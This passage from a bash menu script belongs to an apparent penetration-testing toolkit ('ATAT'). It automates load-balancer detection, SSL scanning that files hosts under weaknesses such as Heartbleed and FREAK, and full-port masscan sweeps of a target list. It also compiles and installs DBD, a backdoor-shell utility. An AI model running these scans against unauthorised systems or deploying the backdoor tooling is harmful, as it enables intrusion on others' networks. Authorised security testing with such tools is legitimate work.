	lbd $IP | tee $outputfile
	cat $outputfile >> LBD_Results.txt
	done
	rm $outputfile
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Processed!\E[1;34m:::::"
            ;;
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done 
  
;;  

 "14" | "14" )
         
 echo -e "\E[1;34m::::: \e[97mMulti Target SSLScan\E[1;34m:::::"
 
PS3='Enter your choice 2=QUIT: '
options=("Run" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Run")
			
	inputfile=~/ATAT/MSF_targets.txt
	outputfile=~SSLScan_Results.txt
	for IP in $(cat $inputfile)
	do
	sslscan --no-failed --no-rejected --certificate-info --verbose $IP | tee $outputfile
		
	cat $outputfile | egrep "Testing|RC4" | grep -B1 RC4 >> rc4.txt
	cat $outputfile | egrep "Testing|SSLv2" | grep -B1 SSLv2 >> sslv2.txt
	cat $outputfile | egrep -B1 "Testing|SSLv3|TLSv1.0" >> heartbleed_targets.txt
	cat $outputfile | egrep "Testing|EXP" | grep -B1 EXP >> freak.txt
	cat $outputfile | egrep "Testing|40 |56 " | egrep -B1 "40 |56 " >> weak_ciphers.txt
	cat $outputfile | egrep "Testing|After" | grep -B1 After >> expired_certs.txt
	cat $outputfile | egrep "Testing|Certificate|Subject|Issuer|valid" | grep -B1 -A4 Certificate >> ssl_certs.txt
	done
                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results!\E[1;34m:::::"
            ;;
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done 
  
;;  

 "15" | "15" )
         
 echo -e "\E[1;34m::::: \e[97mMasscan All TCP Ports\E[1;34m:::::"
 
PS3='Enter your choice 2=QUIT: '
options=("Run" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Run")
	inputfile=~/ATAT/MSF_targets.txt
	outputfile=~masscan_results.txt
	for IP in $(cat $inputfile)
	do
	masscan $IP -p0-65535 --rate 1000 | tee $outputfile
	cat $outputfile | egrep "Discovered open port" | grep -B1 open >> Open_Ports.txt
	done
    rm $outputfile
            echo -e "\E[1;34m::::: \e[97mAll TCP Ports Have Been Scanned!\E[1;34m:::::"
            ;;
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done 
  
;;  

"16" | "16" )
  # Accept upper or lowercase input.
  echo -e "\E[1;34m::::: \e[97mCheck for Dependencies\E[1;34m:::::"

PS3='Enter your choice 3=QUIT: '
options=("Dependencies" "DBD Installer" "Quit") #"Mingw32 Manual Installer")
select opt in "${options[@]}"
do
    case $opt in
        "Dependencies")
		clear
		echo -e "\e[1;34m[*] Performing an APT Update prior to installing dependencies...\e[0m\n"
		sleep 3
		apt-get update
		echo ""
		echo -e "\e[1;32m[+] APT Update complete...\e[0m"
		sleep 3
		clear

		echo -e "\e[1;34m[*] Please wait while I install some dependencies...\e[0m\n"
		sleep 3
#		updatedb
		mkdir /tmp/ATAT/
		echo ""

	reqs="gcc mingw32"
	for i in $reqs; do
		dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
		isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")
		if [ ! -e /usr/bin/$i ] && [ ! -e /usr/sbin/$i ] && [ ! -e /usr/local/sbin/$i ] && [ ! -e /usr/local/bin/$i ] && [ -z "$isinstalled" ]; then
				echo -e "\e[1;34m[-] It doesn't appear that $i is installed on your system. Installing it now...\e[0m"
				echo ""
			if [ ! -z $(apt-get install -y "$i" | grep -o "E: Couldn") ]; then
				echo -e "\e[1;31m[-] I had a hard time installing $i from the Kali-Linux repository.\e[0m"
				touch /tmp/ATAT/$i-fail.txt
			else
				dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
				isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")				
				if [ ! -z "$isinstalled" ]; then
					update=1
					echo -e "\e[1;32m[+] Good news, $i installed without any issues.\e[0m"
					echo ""
					sleep 2
				else
					echo ""
					echo -e "\e[1;31m[!] It doesn't appear that I will be able to install $i right now.\e[0m"
					echo ""
					sleep 2
				fi
			fi
		else
			echo -e "\e[1;32m[+] $i is already installed on your system, moving on...\e[0m"
			echo ""
			sleep 2
		fi
	done
		rm -rf /tmp/ATAT/
			;;
		"DBD Installer")
		dbdinstalled=$(ls /usr/bin/dbd)
		if [ "$dbdinstalled" == "/usr/bin/dbd" ]; then
			echo -e "\n\e[1;34m[*] I see that DBD is already installed...\e[0m"
			echo ""
			sleep 3
			echo "Aufiederszehn" && break
		else
			echo -e "\e[1;34m[*] Performing DBD install...\e[0m\n"
			clear
			echo -e "\e[1;34mPlease wait while I install DBD on your machine...\e[0m"
			echo ""
			sleep 3
			cp ~/ATAT/misc/dbd/conf/dbd_defaults.conf ~/ATAT/misc/dbd/dbd.h
			cd ~/ATAT/misc/dbd/
			make unix
			chmod +x dbd
			cp dbd ~/ATAT/misc/dbd/binaries/
			mv dbd /usr/bin/
			cd ~/ATAT/
			echo "" 
			echo -e "\e[1;32mDone! Returning to the Main Menu...\e[0m"
			echo ""
			sleep 3
	fi
			;;
#		"Mingw32 Manual Installer")
#			echo -e "\e[1;34m[*] Performing MingW32 Install...\e[0m\n"
#			wget http://archive.ubuntu.com/ubuntu/pool/universe/m/mingw32/mingw32_4.2.1.dfsg-2ubuntu1_i386.deb && wget http://archive.ubuntu.com/ubuntu/pool/universe/m/mingw32-binutils/mingw32-binutils_2.20-0.2ubuntu1_i386.deb && wget http://archive.ubuntu.com/ubuntu/pool/universe/m/mingw32-runtime/mingw32-runtime_3.15.2-0ubuntu1_all.deb
#			sudo dpkg -i mingw32_4.2.1.dfsg-2ubuntu1_i386.deb && sudo dpkg -i mingw32-binutils_2.20-0.2ubuntu1_i386.deb && sudo dpkg -i mingw32-runtime_3.15.2-0ubuntu1_all.deb
#			apt-get install -f -y
#			sudo dpkg -i mingw32_4.2.1.dfsg-2ubuntu1_i386.deb && sudo dpkg -i mingw32-binutils_2.20-0.2ubuntu1_i386.deb && sudo dpkg -i mingw32-runtime_3.15.2-0ubuntu1_all.deb
#			sleep 3
#			rm *.deb
#			echo -e "\e[1;32mDone! Returning to the Main Menu...\e[0m"
#			;;
		"Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done 

;;
   
esac

tput sgr0                               # Reset colors to "normal."

exit 0

